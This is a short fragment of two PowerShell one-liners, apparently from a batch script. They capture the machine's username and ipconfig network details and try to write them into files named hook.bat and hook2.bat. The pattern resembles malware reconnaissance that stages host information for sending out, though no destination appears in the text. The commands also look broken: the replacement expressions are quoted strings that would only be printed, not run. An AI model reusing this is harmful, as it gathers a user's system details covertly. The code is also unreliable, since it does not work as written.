powershell -command $w=(whoami) -replace '\\'; "(gc .\hook.bat) -replace '=', $w | Out-File -encoding ASCII hook.bat"
powershell -command $ip=(ipconfig); "(gc .\hook2.bat) -replace '=', $ip | Out-File -encoding ASCII hook2.bat"
